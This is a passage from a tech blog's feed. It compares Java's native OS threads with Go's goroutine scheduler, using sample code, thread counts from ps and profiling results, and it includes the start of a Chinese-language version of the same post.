operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;ExecutorService&lt;/span&gt; executorService &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Executors&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newFixedThreadPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;threadNum&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;200000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token function&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;awaitTermination&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;MAX_VALUE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;NANOSECONDS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I run the code with the number of threads from 100 to 9900 and record the time it runs:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/measure-thread-loading.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;You can see that it take more time to finish the process if Java creates more thread. Let dig deep into what happened by profiling CPU. When the number of threads is set to 100, about 51% of CPU time is spent in function &lt;strong&gt;doSomething:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;And we increase the number of threads to 9900, the CPU time spent in function &lt;strong&gt;doSomething&lt;/strong&gt; is down to about 27%.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-990.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;All of the metrics tell us the cost of the thread makes Java’s thread model suffer in the high concurrency scenario.&lt;/p&gt;
&lt;h1 id=&quot;how-goroutine&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#how-goroutine&quot;&gt;#&lt;/a&gt; How Goroutine&lt;/h1&gt;
&lt;p&gt;Compare to Java, Golang does not use OS’s native thread. Instead, Golang implements its scheduler, arrange goroutines to run spread between a fixed number of threads.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/go-scheduler-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Every thread would switch one goroutine to another goroutine in about 10ms. And the basic police for a thread to pick a goroutine is:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;pick a goroutine from a FIFO per-thread local queue&lt;/li&gt;
&lt;li&gt;pick a goroutine from a global FIFO queue&lt;/li&gt;
&lt;li&gt;steal a goroutine from another thread’s local queue (work-stealing)&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Golang uses GOMAXPROCS parameter to determine how many threads to use in Golang application. The default value is the number of cores.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;To be more specific, let’s run the below go code and monitor the numbers of threads:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Minute&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;	time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Minute&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It shows up that the number of threads is between 4~6.&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;**g7@g7test1**:**~**$ &lt;span class=&quot;token function&quot;&gt;ps&lt;/span&gt; -T &lt;span class=&quot;token number&quot;&gt;1013506&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;wc&lt;/span&gt; -l&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;goroutine%E2%80%99s-memory&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#goroutine%E2%80%99s-memory&quot;&gt;#&lt;/a&gt; Goroutine’s Memory&lt;/h2&gt;
&lt;p&gt;Golang would allocate 4k memory to goroutine in the very beginning. As Goroutine uses more and more memory, Golang would dynamically scale up the stack size. That’s to say the number of goroutines is also bound by the size of memory, but not as suffer as Java’s thread.&lt;/p&gt;
&lt;h2 id=&quot;blocking-system-call&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#blocking-system-call&quot;&gt;#&lt;/a&gt; Blocking System Call&lt;/h2&gt;
&lt;p&gt;Since goroutines are run between threads, what if a thread were blocked by a blocking system call, like file IO?&lt;/p&gt;
&lt;p&gt;Let’s see the below graph, if three of four threads are blocked, would Golang’s throughput be impacted because there was only one thread serve Goroutine?&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;The answer is NO. To solve this problem, Golang design processor to separate goroutine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;If a thread was blocked by a system call, Golang would create a new thread and handoff the whole processor to the new thread. Thus the processor can keep serving goroutine, and the blocking thread could keep waiting system call to finish.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Here is a simple Golang code, create 1000 goroutine to read big file:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;readBigFile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	fi&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; os&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;bigfile&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; fi&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	buf &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		n&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; fi&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;buf&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;EOF &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; n &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;readBigFile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;	time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Minute&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After running it in my Linux VM, ps command show up that the number of threads increasing to 130~200:&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;**g7@g7test1**:**~**$ &lt;span class=&quot;token function&quot;&gt;ps&lt;/span&gt; -T &lt;span class=&quot;token number&quot;&gt;1013506&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;wc&lt;/span&gt; -l&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token number&quot;&gt;142&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So that if you use lots of goroutine to call blocking system call, the concurrency may degrade as Java’s thread model.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you want to know more about goroutine scheduler，please refer &lt;a href=&quot;https://www.youtube.com/watch?v=-K11rY57K7k&amp;amp;t=316s&amp;amp;ab_channel=Hydra&quot;&gt;Go scheduler: Implementing language with lightweight concurrency&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#conclusion&quot;&gt;#&lt;/a&gt; Conclusion&lt;/h1&gt;
&lt;p&gt;So far we had discussed the challenge Java’s thread model meet in high concurrency scenario and how Golang’ goroutine solve these issue. Does that mean Java is powerless in high concurrency?&lt;/p&gt;
&lt;p&gt;Of Course NO. There is an ongoing project name &lt;a href=&quot;https://blogs.oracle.com/javamagazine/going-inside-javas-project-loom-and-virtual-threads&quot;&gt;Loom Project&lt;/a&gt;, it’s purpose is to implement a mechanism like goroutine in JVM. Maybe in the next Java LTS version, we could handle high concurrency in JVM gracefully, just like goroutine.&lt;/p&gt;
&lt;p&gt;By the way, what makes me feel interesting is that before Java 1.2, Java uses green thread which runs virtual thread on OS thread just like goroutine. But green thread suffers some performance issues in multi-core environment. That’s why Java decide to use native afterJava 1.3.&lt;/p&gt;
&lt;p&gt;I wonder that if OS could provide some concurrency mechanism one day as goroutine does, would programing language switch to use native mechanism instead of implementing their scheduler?&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>Java’s Thread Model and Golang Goroutine</title>
		<link href="https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-zh/"/>
		<updated>2021-07-05T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-zh/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;說到 Golang，總會提到其高併發的特性，而 goroutine 則是撐起 Golang 高併發的基礎。本文試著比較 Java thread 和 Golng goroutine 在 OS 運行的方式，讓大家能理解 goroutine 在設計上的獨到之處。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h1 id=&quot;java-thread&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#java-thread&quot;&gt;#&lt;/a&gt; Java Thread&lt;/h1&gt;
&lt;p&gt;Java thread 直接使用 OS 提供的 native thread，即是每一個 Java thread 都是對應 OS 的 thread，完全依賴 OS 去排程調度：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/thread-model-os-thread.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;下面是一段簡單的 Java code，內容是創建 1000 個 thread：&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;當你在 linux 上跑起來用 ps 指令觀察 java 程序，可以看到該程序使用了 1018 個 thread (其中 18 個為 jvm 本身系統使用的 thread，例如 GC 之類的)。&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;**g7@g7test1**:**~**$ &lt;span class=&quot;token function&quot;&gt;ps&lt;/span&gt; -T &lt;span class=&quot;token number&quot;&gt;102763&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;wc&lt;/span&gt; -l&lt;br&gt;&lt;span class=&quot;token number&quot;&gt;1018&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但隨著時代演進，曾經被稱為 lightweight process 的 thread，也逐漸無法應付高併發的場景。&lt;/p&gt;
&lt;h2 id=&quot;%E5%8E%9F%E7%94%9F-thread-%E7%9A%84%E5%95%8F%E9%A1%8C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8E%9F%E7%94%9F-thread-%E7%9A%84%E5%95%8F%E9%A1%8C&quot;&gt;#&lt;/a&gt; 原生 Thread 的問題&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;記憶體&lt;br&gt;
Java 每創建一個 thread 都會分配一個固定的 memory 作為 stack 使用。也就是 OS 的記憶體和 SWAP 空間會限制 Java Application 創建 thread 的數量上限，即便 Java Application 實際上沒用到這麼多記憶體。&lt;br&gt;
